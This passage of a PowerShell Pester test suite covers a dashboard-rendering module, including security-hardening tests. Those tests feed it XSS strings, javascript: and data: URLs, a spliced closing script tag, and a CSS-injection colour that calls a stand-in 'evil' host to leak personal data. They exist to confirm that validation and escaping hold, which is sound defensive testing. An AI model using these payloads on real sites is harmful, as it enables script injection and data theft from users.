        Add-DhRangeBar -Report $report -Id 'rb1' -Title 'A' -Items $items
        { Add-DhRangeBar -Report $report -Id 'rb1' -Title 'B' -Items $items } |
            Should -Throw -ExpectedMessage '*already exists*'
    }

    Context 'FromTable mode' {

        BeforeEach {
            Add-DhTable -Report $script:report -TableId 'clusters' -Title 'C' -Data $script:tblData
        }

        It 'Records the field names and defers aggregation to the browser' {
            Add-DhRangeBar -Report $report -Id 'rb1' -Title 'Load' `
                -TableId 'clusters' -CategoryField 'Cluster' -ValueField 'Load' -HighField 'Capacity'
            $report['Blocks'][0].Mode          | Should -Be 'fromtable'
            $report['Blocks'][0].CategoryField | Should -Be 'Cluster'
            $report['Blocks'][0].HighField     | Should -Be 'Capacity'
            @($report['Blocks'][0].Items).Count | Should -Be 0
        }

        It 'Derives the axis caption from the High source' {
            Add-DhRangeBar -Report $report -Id 'rb1' -Title 'Load' `
                -TableId 'clusters' -CategoryField 'Cluster' -ValueField 'Load' -HighField 'Capacity'
            $report['Blocks'][0].AxisLabel | Should -Be '% of Capacity'
        }

        It 'Throws when the source table does not exist' {
            { Add-DhRangeBar -Report $report -Id 'rb1' -Title 'X' `
                  -TableId 'nope' -CategoryField 'Cluster' -ValueField 'Load' } |
                Should -Throw -ExpectedMessage '*not found*'
        }

        It 'Throws when a field name is not a column of the table' {
            { Add-DhRangeBar -Report $report -Id 'rb1' -Title 'X' `
                  -TableId 'clusters' -CategoryField 'Nope' -ValueField 'Load' } |
                Should -Throw -ExpectedMessage '*is not a column*'
        }

        It 'Throws when -High and -HighField are combined' {
            { Add-DhRangeBar -Report $report -Id 'rb1' -Title 'X' `
                  -TableId 'clusters' -CategoryField 'Cluster' -ValueField 'Load' `
                  -HighField 'Capacity' -High 500 } |
                Should -Throw -ExpectedMessage '*mutually exclusive*'
        }

        It 'Throws when the category cardinality exceeds -MaxRows' {
            { Add-DhRangeBar -Report $report -Id 'rb1' -Title 'X' `
                  -TableId 'clusters' -CategoryField 'Cluster' -ValueField 'Load' -MaxRows 1 } |
                Should -Throw -ExpectedMessage '*over -MaxRows*'
        }

        It 'Warns about non-numeric values rather than coercing them to zero' {
            $r2 = New-DhDashboard -Title 'T2'
            Add-DhTable -Report $r2 -TableId 't' -Title 'T' -Data @(
                @{ K='a'; V=1 }, @{ K='a'; V='n/a' }, @{ K='b'; V=3 })
            $w = $null
            Add-DhRangeBar -Report $r2 -Id 'rb1' -Title 'X' -TableId 't' `
                -CategoryField 'K' -ValueField 'V' -WarningVariable w -WarningAction SilentlyContinue
            @($w).Count | Should -BeGreaterThan 0
        }

        It 'Throws when no row has a numeric value field' {
            $r3 = New-DhDashboard -Title 'T3'
            Add-DhTable -Report $r3 -TableId 't' -Title 'T' -Data @(@{ K='a'; V='x' }, @{ K='b'; V='y' })
            { Add-DhRangeBar -Report $r3 -Id 'rb1' -Title 'X' -TableId 't' `
                  -CategoryField 'K' -ValueField 'V' } | Should -Throw -ExpectedMessage '*no row*'
        }

        It 'Rejects -Items combined with -TableId' {
            { Add-DhRangeBar -Report $report -Id 'rb1' -Title 'X' `
                  -Items $items -TableId 'clusters' -CategoryField 'Cluster' -ValueField 'Load' } |
                Should -Throw
        }
    }

    It 'HTML carries the block, the renderer and the theme gradient tokens' {
        $tmp = Join-Path ([IO.Path]::GetTempPath()) ('DH_RbTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmp | Out-Null
        try {
            Add-DhRangeBar -Report $report -Id 'rb-export' -Title 'Load' `
                -Items $items -Unit 'req/s' -ShowDataTable -AxisLabel '% of capacity'
            $htmlPath = Join-Path $tmp 'test-rangebar.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"rangebar"'
            $content | Should -Match '"mode":"items"'
            $content | Should -Match '"axisLabel":"% of capacity"'
            $content | Should -Match '"unit":"req/s"'
            $content | Should -Match '"showDataTable":true'
            $content | Should -Match 'function renderRangeBar'
            $content | Should -Match 'function computeRangeRows'
            $content | Should -Match '--range-grad-0'
            # numbers must serialise InvariantCulture, whatever the host culture
            $content | Should -Match '"high":315'
        } finally {
            Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'Serialises decimals with a dot under a comma-decimal culture' {
        $tmp = Join-Path ([IO.Path]::GetTempPath()) ('DH_RbCult_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmp | Out-Null
        $prev = [System.Threading.Thread]::CurrentThread.CurrentCulture
        try {
            [System.Threading.Thread]::CurrentThread.CurrentCulture = [System.Globalization.CultureInfo]::GetCultureInfo('it-IT')
            Add-DhRangeBar -Report $report -Id 'rb-cult' -Title 'X' -Items @(
                @{ Name='a'; Low=0; High=10.5; Min=1.5; Avg=2.25; Max=3.75 })
            $htmlPath = Join-Path $tmp 'cult.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"avg":2\.25'
            $content | Should -Not -Match '"avg":2,25'
        } finally {
            [System.Threading.Thread]::CurrentThread.CurrentCulture = $prev
            Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhTopologyMap   (v1.5)
# ---------------------------------------------------------------------------
Describe 'Add-DhTopologyMap' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:nodes = @(
            @{ Id='forest'; Label='contoso.com';    Parent=$null;    Status='ok' }
            @{ Id='dom-hq'; Label='hq.contoso.com'; Parent='forest'; Status='ok' }
            @{ Id='dom-eu'; Label='eu.contoso.com'; Parent='forest'; Status='warn' }
            @{ Id='dc01';   Label='DC01';           Parent='dom-hq'; Status='ok' }
            @{ Id='dc02';   Label='DC02';           Parent='dom-hq'; Status='ok' }
            @{ Id='dc03';   Label='DC03';           Parent='dom-eu'; Status='warn'; Tooltip='Replication lag 4m' }
            @{ Id='dc04';   Label='DC04';           Parent='dom-eu'; Status='danger' }
        )
    }

    It 'Adds a topologymap block to the report Blocks list' {
        Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'AD Forest' -Nodes $nodes
        $report['Blocks']                   | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType      | Should -Be 'topologymap'
        @($report['Blocks'][0].Nodes).Count | Should -Be 7
        $report['Blocks'][0].Direction      | Should -Be 'vertical'
        $report['Blocks'][0].NodeWidth      | Should -Be 140
        $report['Blocks'][0].NodeHeight     | Should -Be 44
    }

    It 'Direction accepts vertical / horizontal' {
        foreach ($d in 'vertical','horizontal') {
            $r = New-DhDashboard -Title 'T'
            Add-DhTopologyMap -Report $r -Id 'tm' -Title 'X' -Nodes $nodes -Direction $d
            $r['Blocks'][0].Direction | Should -Be $d
        }
    }

    It 'Direction rejects unknown values' {
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'X' -Nodes $nodes -Direction 'diagonal' } | Should -Throw
    }

    It 'Throws when a node references an unknown Parent' {
        $bad = @(
            @{ Id='a'; Label='A'; Parent=$null }
            @{ Id='b'; Label='B'; Parent='nope' }
        )
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'X' -Nodes $bad } | Should -Throw
    }

    It 'Throws on cycles' {
        $bad = @(
            @{ Id='a'; Label='A'; Parent='b' }
            @{ Id='b'; Label='B'; Parent='a' }
        )
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'X' -Nodes $bad } | Should -Throw
    }

    It 'Throws when a node is its own Parent' {
        $bad = @(@{ Id='x'; Label='X'; Parent='x' })
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'X' -Nodes $bad } | Should -Throw
    }

    It 'Throws on duplicate node Id' {
        $bad = @(
            @{ Id='dup'; Label='A'; Parent=$null }
            @{ Id='dup'; Label='B'; Parent=$null }
        )
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'X' -Nodes $bad } | Should -Throw
    }

    It 'Throws when a node is missing Id or Label' {
        $bad = @(@{ Label='no-id' })
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'X' -Nodes $bad } | Should -Throw
        $bad2 = @(@{ Id='no-label' })
        { Add-DhTopologyMap -Report $report -Id 'tm2' -Title 'X' -Nodes $bad2 } | Should -Throw
    }

    It 'Rejects invalid Status' {
        $bad = @(@{ Id='a'; Label='A'; Parent=$null; Status='broken' })
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'X' -Nodes $bad } | Should -Throw
    }

    It 'LinkFilter without LinkTableId throws' {
        $bad = @(@{ Id='a'; Label='A'; Parent=$null; LinkFilter='just-filter' })
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'X' -Nodes $bad } | Should -Throw
    }

    It 'Throws on duplicate block Id' {
        Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'A' -Nodes $nodes
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'B' -Nodes $nodes } | Should -Throw
    }

    It 'Throws when Nodes exceeds MaxNodes' {
        $big = 1..210 | ForEach-Object { @{ Id="n$_"; Label="N$_"; Parent=$null } }
        { Add-DhTopologyMap -Report $report -Id 'tm-big' -Title 'X' -Nodes $big } | Should -Throw
    }

    It 'Accepts multiple root nodes (forest)' {
        $forest = @(
            @{ Id='r1'; Label='Root1'; Parent=$null }
            @{ Id='r2'; Label='Root2'; Parent=$null }
            @{ Id='c1'; Label='Child'; Parent='r1' }
        )
        Add-DhTopologyMap -Report $report -Id 'tm-forest' -Title 'X' -Nodes $forest
        @($report['Blocks'][0].Nodes).Count | Should -Be 3
    }

    It 'HTML contains topologymap block + renderTopologyMap renderer' {
        $tmp = Join-Path ([IO.Path]::GetTempPath()) ('DH_TmTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmp | Out-Null
        try {
            $nodesAct = $nodes + @{
                Id='dc05'; Label='DC05'; Parent='dom-eu'; Status='ok';
                LinkTableId='incidents'; LinkFilter='dc05'
            }
            Add-DhTopologyMap -Report $report -Id 'tm-export' -Title 'AD Forest' `
                -Nodes $nodesAct -Direction 'vertical'
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'incidents' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmp 'test-topology.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"topologymap"'
            $content | Should -Match '"direction":"vertical"'
            $content | Should -Match '"id":"forest"'
            $content | Should -Match '"label":"contoso.com"'
            $content | Should -Match '"status":"danger"'
            $content | Should -Match '"linkTableId":"incidents"'
            $content | Should -Match '"linkFilter":"dc05"'
            $content | Should -Match 'function renderTopologyMap'
        } finally {
            Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ============================================================================
#  v1.5.3 — security hardening
# ============================================================================

Describe 'Security: Add-DhPieChart slice Color validation' {
    BeforeEach {
        $script:report = New-DhDashboard -Title 'sec' -Theme 'Default'
    }
    It 'accepts hex literals (#fff, #ffffff, #ffffffff)' {
        { Add-DhPieChart -Report $script:report -Id 'p1' -Title 't' -Slices @(
            @{ Label='a'; Value=1; Color='#fff'      }
            @{ Label='b'; Value=1; Color='#1B6B35'   }
            @{ Label='c'; Value=1; Color='#1B6B3580' }
        ) } | Should -Not -Throw
    }
    It 'accepts rgb()/rgba()/hsl()/hsla() and var(--token)' {
        { Add-DhPieChart -Report $script:report -Id 'p2' -Title 't' -Slices @(
            @{ Label='a'; Value=1; Color='rgb(10, 20, 30)' }
            @{ Label='b'; Value=1; Color='rgba(0,0,0,0.5)' }
            @{ Label='c'; Value=1; Color='hsl(120,50%,40%)' }
            @{ Label='d'; Value=1; Color='var(--accent-primary)' }
        ) } | Should -Not -Throw
    }
    It 'rejects a CSS-injection payload (semicolon and url())' {
        { Add-DhPieChart -Report $script:report -Id 'p3' -Title 't' -Slices @(
            @{ Label='evil'; Value=1; Color='red; background-image: url(http://evil/log?u=PII)' }
        ) } | Should -Throw -ExpectedMessage '*Add-DhPieChart: slice*Color*not a recognised CSS colour*'
    }
    It 'rejects parentheses outside a recognised function' {
        { Add-DhPieChart -Report $script:report -Id 'p4' -Title 't' -Slices @(
            @{ Label='evil'; Value=1; Color='attr(data-x)' }
        ) } | Should -Throw -ExpectedMessage '*not a recognised CSS colour*'
    }
}

Describe 'Security: Add-DhLineChart series Color validation' {
    BeforeEach {
        $script:report = New-DhDashboard -Title 'sec' -Theme 'Default'
    }
    It 'rejects a CSS-injection payload on a series Color' {
        { Add-DhLineChart -Report $script:report -Id 'l1' -Title 't' `
            -XAxis @('Mon','Tue','Wed') -Series @(
                @{ Label='evil'; Values=@(1,2,3); Color='red;background:url(http://evil/x)' }
            ) } | Should -Throw -ExpectedMessage '*Add-DhLineChart: series*Color*not a recognised CSS colour*'
    }
    It 'accepts a clean hex color' {
        { Add-DhLineChart -Report $script:report -Id 'l2' -Title 't' `
            -XAxis @('Mon','Tue') -Series @(
                @{ Label='clean'; Values=@(1,2); Color='#1B6B35' }
            ) } | Should -Not -Throw
    }
}

Describe 'Security: Add-DhAlertBanner Action.Url scheme validation' {
    BeforeEach {
        $script:report = New-DhDashboard -Title 'sec' -Theme 'Default'
    }
    It 'rejects javascript: URLs' {
        { Add-DhAlertBanner -Report $script:report -Id 'b1' -Severity 'info' `
            -Message 'msg' -Action @{ Label='click'; Url='javascript:alert(1)' } } |
            Should -Throw -ExpectedMessage '*scheme that is not allowed*'
    }
    It 'rejects data: URLs' {
        { Add-DhAlertBanner -Report $script:report -Id 'b2' -Severity 'info' `
            -Message 'msg' -Action @{ Label='click'; Url='data:text/html,<script>alert(1)</script>' } } |
            Should -Throw -ExpectedMessage '*scheme*not allowed*'
    }
    It 'accepts https://, http://, mailto:, tel:, and #anchor' {
        { Add-DhAlertBanner -Report $script:report -Id 'b3' -Severity 'info' `
            -Message 'msg' -Action @{ Label='click'; Url='https://example.com/path' } } | Should -Not -Throw
        { Add-DhAlertBanner -Report $script:report -Id 'b4' -Severity 'info' `
            -Message 'msg' -Action @{ Label='click'; Url='mailto:ops@example.com' } } | Should -Not -Throw
        { Add-DhAlertBanner -Report $script:report -Id 'b5' -Severity 'info' `
            -Message 'msg' -Action @{ Label='click'; Url='#somewhere' } } | Should -Not -Throw
    }
}

Describe 'Security: Add-DhSummary tile Action.Url scheme validation' {
    BeforeEach {
        $script:report = New-DhDashboard -Title 'sec' -Theme 'Default'
    }
    It 'rejects javascript: URLs on tile Actions' {
        { Add-DhSummary -Report $script:report -Items @(
            @{ Label='Total'; Value=1; Action=@{ Label='go'; Url='javascript:alert(1)' } }
        ) } | Should -Throw -ExpectedMessage '*scheme that is not allowed*'
    }
    It 'accepts https tile Action URLs' {
        { Add-DhSummary -Report $script:report -Items @(
            @{ Label='Total'; Value=1; Action=@{ Label='go'; Url='https://intra.example.com/dash' } }
        ) } | Should -Not -Throw
    }
}

Describe 'Security: -AllowHtml policy on raw-HTML sinks' {
    BeforeEach {
        $script:report = New-DhDashboard -Title 'allowhtml' -Theme 'Default'
    }

    # -- Add-DhHtmlBlock ----------------------------------------------------
    Context 'Add-DhHtmlBlock -Content' {
        It 'HTML-encodes by default (v2.0.0 flipped AllowHtml to $false)' {
            Add-DhHtmlBlock -Report $script:report -Id 'h1' -Content '<b>x</b>' -WarningAction SilentlyContinue
            $script:report.Blocks[0].Content | Should -BeExactly '&lt;b&gt;x&lt;/b&gt;'
        }
        It 'warns when markup is encoded by the default, so the change is not silent' {
            $w = $null
            Add-DhHtmlBlock -Report $script:report -Id 'h1w' -Content '<b>x</b>' -WarningVariable w -WarningAction SilentlyContinue
            @($w).Count | Should -BeGreaterThan 0
        }
        It 'does not warn when the caller chose explicitly' {
            $w = $null
            Add-DhHtmlBlock -Report $script:report -Id 'h1e' -Content '<b>x</b>' -AllowHtml:$true -WarningVariable w -WarningAction SilentlyContinue
            @($w).Count | Should -Be 0
        }
        It 'HTML-encodes the content when -AllowHtml:$false' {
            Add-DhHtmlBlock -Report $script:report -Id 'h2' -Content '<script>alert(1)</script>' -AllowHtml:$false
            $script:report.Blocks[0].Content | Should -BeExactly '&lt;script&gt;alert(1)&lt;/script&gt;'
        }
        It 'keeps raw markup when -AllowHtml:$true is explicit' {
            Add-DhHtmlBlock -Report $script:report -Id 'h3' -Content '<i>y</i>' -AllowHtml:$true
            $script:report.Blocks[0].Content | Should -BeExactly '<i>y</i>'
        }
        It 'warns when content looks like HTML and -AllowHtml not passed' {
            Add-DhHtmlBlock -Report $script:report -Id 'h4' -Content '<div>z</div>' -WarningVariable w -WarningAction SilentlyContinue
            @($w).Count | Should -BeGreaterThan 0
            [string]$w | Should -Match '2\.0\.0'
        }
        It 'does NOT warn for plain-text content' {
            Add-DhHtmlBlock -Report $script:report -Id 'h5' -Content 'plain text only' -WarningVariable w -WarningAction SilentlyContinue
            @($w).Count | Should -Be 0
        }
        It 'does NOT warn when -AllowHtml:$true is explicit' {
            Add-DhHtmlBlock -Report $script:report -Id 'h6' -Content '<span>q</span>' -AllowHtml:$true -WarningVariable w -WarningAction SilentlyContinue
            @($w).Count | Should -Be 0
        }
        It 'does NOT warn when -AllowHtml:$false (content is being encoded anyway)' {
            Add-DhHtmlBlock -Report $script:report -Id 'h7' -Content '<span>q</span>' -AllowHtml:$false -WarningVariable w -WarningAction SilentlyContinue
            @($w).Count | Should -Be 0
        }
    }

    # -- Add-DhAlertBanner --------------------------------------------------
    Context 'Add-DhAlertBanner -Message' {
        It 'encodes the message when -AllowHtml:$false' {
            Add-DhAlertBanner -Report $script:report -Id 'a1' -Severity 'info' -Message '<img src=x onerror=alert(1)>' -AllowHtml:$false
            $script:report.AlertBanners[0].Message | Should -BeExactly '&lt;img src=x onerror=alert(1)&gt;'
        }
        It 'HTML-encodes the message by default (v2.0.0)' {
            Add-DhAlertBanner -Report $script:report -Id 'a2' -Severity 'info' -Message '<b>hot</b>' -WarningAction SilentlyContinue
            $script:report.AlertBanners[0].Message | Should -BeExactly '&lt;b&gt;hot&lt;/b&gt;'
        }
    }

    # -- Add-DhCollapsible --------------------------------------------------
    Context 'Add-DhCollapsible -Content' {
        It 'encodes free-form content when -AllowHtml:$false' {
            Add-DhCollapsible -Report $script:report -Id 'c1' -Title 'T' -Content '<p>raw</p>' -AllowHtml:$false
            ($script:report.Blocks | Where-Object Id -eq 'c1').Content | Should -BeExactly '&lt;p&gt;raw&lt;/p&gt;'
        }
        It 'does not warn or alter when Content is empty (card mode)' {
            Add-DhCollapsible -Report $script:report -Id 'c2' -Title 'T' -Cards @(
                @{ Title='Card'; Fields=@(@{ Label='k'; Value='v' }) }
            ) -WarningVariable w -WarningAction SilentlyContinue
            @($w).Count | Should -Be 0
        }
    }

    # -- Add-DhTabs ---------------------------------------------------------
    Context 'Add-DhTabs per-tab Content' {
        It 'encodes each tab content when -AllowHtml:$false' {
            Add-DhTabs -Report $script:report -Id 't1' -Tabs @(
                @{ Title='Raw'; Content='<h2>hi</h2>' }
            ) -AllowHtml:$false
            $tabsBlock = $script:report.Blocks | Where-Object Id -eq 't1'
            $tabsBlock.Tabs[0].Content | Should -BeExactly '&lt;h2&gt;hi&lt;/h2&gt;'
        }
        It 'HTML-encodes tab content by default (v2.0.0)' {
            Add-DhTabs -Report $script:report -Id 't2' -Tabs @(
                @{ Title='Raw'; Content='<h2>hi</h2>' }
            ) -WarningAction SilentlyContinue
            $tabsBlock = $script:report.Blocks | Where-Object Id -eq 't2'
            $tabsBlock.Tabs[0].Content | Should -BeExactly '&lt;h2&gt;hi&lt;/h2&gt;'
        }
    }

    # -- End-to-end: encoded content survives to the rendered HTML ----------
    Context 'end-to-end render' {
        It 'an encoded payload appears escaped (not executable) in the exported HTML' {
            Add-DhHtmlBlock -Report $script:report -Id 'e2e' -Content '<script>evil()</script>' -AllowHtml:$false
            $tmp = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_allowhtml_$([guid]::NewGuid().ToString('N')).html")
            try {
                Export-DhDashboard -Report $script:report -OutputPath $tmp -Force | Out-Null
                $html = Get-Content -LiteralPath $tmp -Raw
                # The block config must carry the escaped form, never the raw <script>evil()</script>.
                $html | Should -Match 'evil\(\)'                       # payload text is present
                $html | Should -Not -Match '<script>evil\(\)</script>' # but never as a live tag
            } finally {
                if (Test-Path -LiteralPath $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
            }
        }
    }
}

Describe 'Security: ConvertTo-DhJsonString line/paragraph separator escaping' {
    # ConvertTo-DhJsonString is a Private helper (not exported), and InModuleScope
    # fails when a previously installed copy of DashHtml is also loaded in the
    # session (e.g. after Publish-Module). Drive the helper through a public sink:
    # we put U+2028 and U+2029 into a Summary tile Label, render the dashboard,
    # and verify the embedded SUMMARY_CONFIG JSON contains the escaped sequences
    # instead of raw line terminators. End-to-end test, immune to InModuleScope.
    BeforeAll {
        $script:srcHtmlSep = $null
        try {
            $rpt = New-DhDashboard -Title 'sec-sep' -Theme 'Default'
            Add-DhSummary -Report $rpt -Items @(
                @{ Label=('ls' + [char]0x2028 + 'tail'); Value=1 }
                @{ Label=('ps' + [char]0x2029 + 'tail'); Value=2 }
            )
            $tmpPath = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_sep_test_$([guid]::NewGuid().ToString('N')).html")
            Export-DhDashboard -Report $rpt -OutputPath $tmpPath -Force | Out-Null
            $script:srcHtmlSep = Get-Content -LiteralPath $tmpPath -Raw
            Remove-Item -LiteralPath $tmpPath -Force -ErrorAction SilentlyContinue
        } catch {
            $script:srcHtmlSep = "ERROR: $($_.ToString())"
        }
    }
    It 'embeds U+2028 as the literal \u2028 escape inside the JS payload' {
        $script:srcHtmlSep | Should -Match 'ls\\u2028tail'
        # Negative: the raw line separator must not survive in the script block
        $script:srcHtmlSep -match ([regex]::Escape('ls' + [char]0x2028 + 'tail')) | Should -BeFalse
    }
    It 'embeds U+2029 as the literal \u2029 escape inside the JS payload' {
        $script:srcHtmlSep | Should -Match 'ps\\u2029tail'
        $script:srcHtmlSep -match ([regex]::Escape('ps' + [char]0x2029 + 'tail')) | Should -BeFalse
    }
}

Describe 'Security: ConvertTo-DhJsonString escaping survives the 1.10.3 fast path' {
    # 1.10.3 added an IndexOfAny pre-check that skips the nine regex passes when a
    # string contains nothing to escape. These cases pin every rule the fast path
    # must NOT bypass. Driven through table cell data (the hot serialisation loop)
    # rather than InModuleScope, for the same reason as the U+2028 suite above.
    BeforeAll {
        $script:srcHtmlEsc = $null
        try {
            $rpt = New-DhDashboard -Title 'esc' -Theme 'Default'
            Add-DhTable -Report $rpt -TableId 'esc' -Title 'Esc' -Data @(
                [ordered]@{
                    Plain    = 'plain_ascii_value'
                    Script   = 'a</script>b'
                    # CR is DROPPED, not escaped, so '<' CR '/' collapses to '</'
                    # DURING escaping and must still be caught by the '</' rule.
                    CrSplice = "x<$([char]13)/script>y"
                    Lt       = 'a<b'
                    Bslash   = 'a\b'
                    Quote    = 'a"b'
                    Tab      = "a$([char]9)b"
                    Lf       = "a$([char]10)b"
                    Ctrl     = "a$([char]1)b"
                }
            )
            $tmpPath = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_esc_test_$([guid]::NewGuid().ToString('N')).html")
            Export-DhDashboard -Report $rpt -OutputPath $tmpPath -Force | Out-Null
            $script:srcHtmlEsc = Get-Content -LiteralPath $tmpPath -Raw
            Remove-Item -LiteralPath $tmpPath -Force -ErrorAction SilentlyContinue
        } catch {
            $script:srcHtmlEsc = "ERROR: $($_.ToString())"
        }
    }

    It 'passes a plain string through the fast path unaltered' {
        $script:srcHtmlEsc | Should -Match 'plain_ascii_value'
    }

    # NB: no angle brackets in It names - Pester 5 parses <...> as a -ForEach template token.
    It 'escapes a closing script tag so it cannot terminate the enclosing block' {
        $script:srcHtmlEsc | Should -Match 'a<\\/script>b'
        $script:srcHtmlEsc -match ([regex]::Escape('a</script>b')) | Should -BeFalse
    }

    It 'still catches a closing script tag spliced together by the dropped CR (pass order)' {
        # Regression guard: folding the nine passes into one regex over the
        # ORIGINAL string would miss this and emit a live </script>.
        $script:srcHtmlEsc | Should -Match 'x<\\/script>y'
        $script:srcHtmlEsc -match ([regex]::Escape('x</script>y')) | Should -BeFalse
    }

    It 'leaves a lone < untouched' {
        $script:srcHtmlEsc | Should -Match '"a<b"'
    }

    It 'escapes backslash, double-quote, tab, newline and C0 controls' {
        $script:srcHtmlEsc | Should -Match 'a\\\\b'      # a\b   -> a\\b
        $script:srcHtmlEsc | Should -Match 'a\\"b'       # a"b   -> a\"b
        $script:srcHtmlEsc | Should -Match 'a\\tb'       # tab   -> \t
        $script:srcHtmlEsc | Should -Match 'a\\nb'       # LF    -> \n
        $script:srcHtmlEsc | Should -Match 'a\\u0001b'   # C0 -> 6-char \uXXXX
    }
}

Describe 'Performance: table sort comparator does not re-resolve collation per comparison' {
    # 1.10.4. The sort comparator used to call
    #   String(av).localeCompare(String(bv), undefined, {sensitivity:'base'})
    # on EVERY comparison (~n log n). Passing an options object makes the engine
    # resolve collation settings per call: measured 5.6 s of blocked main thread
    # to sort a 19,011-row column, vs 169 ms after the fix (~33x).
    # These assertions pin the shape of the fix, since the cost is invisible to
    # any functional test - the old code sorted correctly, just glacially.
    BeforeAll {
        $script:jsTable = Get-Content -LiteralPath (Join-Path $PSScriptRoot '../DashHtml/Private/Get-DhJsTable.ps1') -Raw
    }

    It 'builds a single reusable Intl.Collator' {
        $script:jsTable | Should -Match 'new Intl\.Collator\(undefined,\s*\{sensitivity:''base''\}\)'
    }

    It 'does not call localeCompare with an options object inside the comparator' {
        # Strip block comments first: the note above the fix legitimately quotes
        # the old call shape, and would otherwise count as a hit.
        $code = [regex]::Replace($script:jsTable, '/\*.*?\*/', '', 'Singleline')
        $hits = [regex]::Matches($code, '\.localeCompare\([^)]*sensitivity')
        # Exactly one survivor: the fallback used only when Intl.Collator is absent.
        $hits.Count | Should -Be 1
    }

    It 'precomputes sort keys outside the comparator (decorate/sort/undecorate)' {
        $script:jsTable | Should -Match 'dec\[di\]\s*=\s*\{r:row'
        $script:jsTable | Should -Match 'ks\[fi\]=String\(v\)'
    }

    It 'still reduces sparkline columns before comparing' {
        $script:jsTable | Should -Match "cellType === 'sparkline'"
        $script:jsTable | Should -Match 'sparkReduce\(v, col\.sortBy\)'
    }

    It 'sorts a multi-column table end to end without error' {
        $rows = 1..200 | ForEach-Object {
            [pscustomobject]@{ Name = "srv$(200 - $_)"; Num = ($_ % 37); Txt = @('alpha','Beta','gamma')[$_ % 3] }
        }
        $r = New-DhDashboard -Title 'sortcheck'
        Add-DhTable -Report $r -TableId 'sc' -Title 'SC' -Data $rows
        $tmp = Join-Path ([IO.Path]::GetTempPath()) ("dh_sort_$([guid]::NewGuid().ToString('N')).html")
        { Export-DhDashboard -Report $r -OutputPath $tmp -Force } | Should -Not -Throw
        (Get-Content $tmp -Raw) | Should -Match 'new Intl\.Collator'
        Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    }
}

Describe 'Security: exported HTML pins CDN scripts with SRI' {
    # Build the rendered HTML once at discovery time. Pester 5 runs Discovery and
    # Run in separate phases; computing the export in BeforeAll keeps the It body
    # tiny (and lets us pinpoint the failure if Export-DhDashboard ever changes).
    BeforeAll {
        $script:srcHtmlSri = $null
        try {
            $rpt = New-DhDashboard -Title 'sec' -Theme 'Default'
            Add-DhSummary -Report $rpt -Items @( @{ Label='x'; Value=1 } )
            $tmpPath = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_sri_test_$([guid]::NewGuid().ToString('N')).html")
            Export-DhDashboard -Report $rpt -OutputPath $tmpPath -Force | Out-Null
            $script:srcHtmlSri = Get-Content -LiteralPath $tmpPath -Raw
            Remove-Item -LiteralPath $tmpPath -Force -ErrorAction SilentlyContinue
        } catch {
            $script:srcHtmlSri = "ERROR: $($_.ToString())"
        }
    }
    # v2.2.0 - the libraries are no longer <script> tags; the lazy loader
    # carries each URL with its hash and sets integrity= when it injects them.
    It 'pins xlsx with sha384 SRI' {
        $script:srcHtmlSri | Should -Match 'xlsx\.full\.min\.js","sri":"sha384-'
    }
    It 'pins jspdf with sha384 SRI' {
        $script:srcHtmlSri | Should -Match 'jspdf\.umd\.min\.js","sri":"sha384-'
    }
    It 'pins jspdf-autotable with sha384 SRI' {
        $script:srcHtmlSri | Should -Match 'jspdf\.plugin\.autotable\.min\.js","sri":"sha384-'
    }
    It 'applies the hash and crossorigin when it injects a library' {
        $script:srcHtmlSri | Should -Match 's\.integrity = lib\.sri;'
        $script:srcHtmlSri | Should -Match "s\.crossOrigin = 'anonymous';"
    }
}

# ============================================================================
#  v1.7.0 — P2 UX / perf features
# ============================================================================

Describe 'Topology: -Interactive parameter' {
    BeforeEach {
        $script:report = New-DhDashboard -Title 'topo' -Theme 'Default'
        $script:nodes = @(
            @{ Id='r'; Label='root'; Parent=$null }
            @{ Id='a'; Label='a'; Parent='r' }
            @{ Id='b'; Label='b'; Parent='r' }
        )
    }
    It 'defaults Interactive to $true and emits interactive:true' {
        Add-DhTopologyMap -Report $script:report -Id 'topo' -Title 'T' -Nodes $script:nodes
        ($script:report.Blocks | Where-Object Id -eq 'topo').Interactive | Should -BeTrue
    }
    It 'honours -Interactive:$false' {
        Add-DhTopologyMap -Report $script:report -Id 'topo' -Title 'T' -Nodes $script:nodes -Interactive:$false
        ($script:report.Blocks | Where-Object Id -eq 'topo').Interactive | Should -BeFalse
    }
    It 'emits the interactive flag + pan/zoom/collapse JS in the exported HTML' {
        Add-DhTopologyMap -Report $script:report -Id 'topo' -Title 'T' -Nodes $script:nodes
